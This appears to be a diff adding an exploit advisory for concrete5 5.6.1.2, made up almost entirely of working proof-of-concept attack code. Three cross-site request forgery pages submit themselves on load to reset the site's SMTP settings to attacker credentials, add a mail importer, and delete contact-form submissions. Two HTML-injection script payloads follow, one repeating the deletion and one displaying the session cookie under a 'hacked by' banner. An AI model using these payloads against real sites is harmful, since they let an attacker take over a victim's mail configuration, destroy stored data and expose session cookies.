@@ -1,0 +1,111 @@
+ 
+1. Cross-site request forgery:
+
+<html>
+<head>
+<script type="text/javascript" language="javascript">
+ function submitform()
+ {
+    document.getElementById('myForm').submit();
+ }
+ </script>
+</head>
+<body>
+<form name="myForm" method="post" action="http://www.example.com/concrete5.6.1.2/concrete5.6.1.2/index.php/dashboard/system/mail/method/save_settings/" class="form-horizontal" id="mail-settings-form" original-class="form-horizontal">
+ 
+<input type="radio" name="MAIL_SEND_METHOD" id="MAIL_SEND_METHOD2" value="SMTP" class="ccm-input-radio" checked>
+<input id="MAIL_SEND_METHOD_SMTP_SERVER" type="text" name="MAIL_SEND_METHOD_SMTP_SERVER" value="www.example.com" class="ccm-input-text">               
+<input id="MAIL_SEND_METHOD_SMTP_USERNAME" type="text" name="MAIL_SEND_METHOD_SMTP_USERNAME" value="expl0i13r" class="ccm-input-text">               
+<input id="MAIL_SEND_METHOD_SMTP_PASSWORD" type="text" name="MAIL_SEND_METHOD_SMTP_PASSWORD" value="expl0i13r" class="ccm-input-text">               
+<select name="MAIL_SEND_METHOD_SMTP_ENCRYPTION" id="MAIL_SEND_METHOD_SMTP_ENCRYPTION" ccm-passed-value="SSL" class="ccm-input-select">
+<option value="">None</option>
+<option value="SSL" selected="selected">SSL</option>
+<option value="TLS">TLS</option></select>
+<input id="MAIL_SEND_METHOD_SMTP_PORT" type="text" name="MAIL_SEND_METHOD_SMTP_PORT" value="" class="ccm-input-text">            
+ 
+</form>
+<script type="text/javascript" language="javascript">
+document.myForm.submit()
+</script>
+</body>
+</html>
+ 
+ 
+
+
+ 
+<html>
+<head>
+<script type="text/javascript" language="javascript">
+ 
+ function submitform()
+ {
+    document.getElementById('myForm').submit();
+ 
+ }
+ 
+</script>
+</head>
+ 
+<body>
+ 
+<form name = "myForm" method="post" id="mail-importer-form" class="form-horizontal" action="http://www.example.com/concrete5.6.1.2/concrete5.6.1.2/index.php/dashboard/system/mail/importers/save_importer/" original-class="form-horizontal">
+ 
+<input type="hidden" name="miID" id="miID" value="1">    
+<input id="miEmail" type="text" name="miEmail" value="exploiter">
+<input id="miServer" type="text" name="miServer" value="www.example.com" class="ccm-input-text">           
+<input id="miUsername" type="text" name="miUsername" value="" class="ccm-input-text">        
+<input id="miPassword" type="text" name="miPassword" value="" class="ccm-input-text">         <input id="miPort" type="text" name="miPort" value="8080" class="ccm-input-text">                
+             
+<select name="miEncryption" id="miEncryption" ccm-passed-value="" class="ccm-input-select">
+<option value="" selected="selected">None</option>
+</select>
+ 
+<select name="miIsEnabled" id="miIsEnabled" ccm-passed-value="1" class="ccm-input-select">
+<option value="1"  selected="selected">Yes</option>
+</select>            
+     
+<select name="miConnectionMethod" id="miConnectionMethod" ccm-passed-value="POP" class="ccm-input-select">
+<option value="POP" selected="selected">POP</option>
+</select>            
+ 
+<script type="text/javascript" language="javascript">
+ document.myForm.submit()
+</script>
+ 
+</body>
+</html>
+ 
+
+
+
+ 
+<html>
+<head>
+<script>
+function delete()
+{
+ 
+# Delete Submissins "Contact Us" page
+ 
+window.open("http://www.example.com/concrete5.6.1.2/concrete5.6.1.2/index.php/dashboard/reports/forms/?qsID=1370626098&action=deleteFormAnswers")
+ 
+}
+</script>
+</head>
+<body onload="delete()">
+</body>
+</html>
+
+
+2. HTML-injection:
+
+"><script>window.open("http://www.example.com/concrete5.6.1.2/concrete5.6.1.2/index.php/dashboard/reports/forms/?qsID=1370626098&action=deleteFormAnswers");alert('Form Result Data Deleted - eXpl0i13r')</script>
+ 
+ 
+"><script>alert('hacked by eXpl0i13r\n'+document.cookie)</script>
+ 
+ 
+
+
+
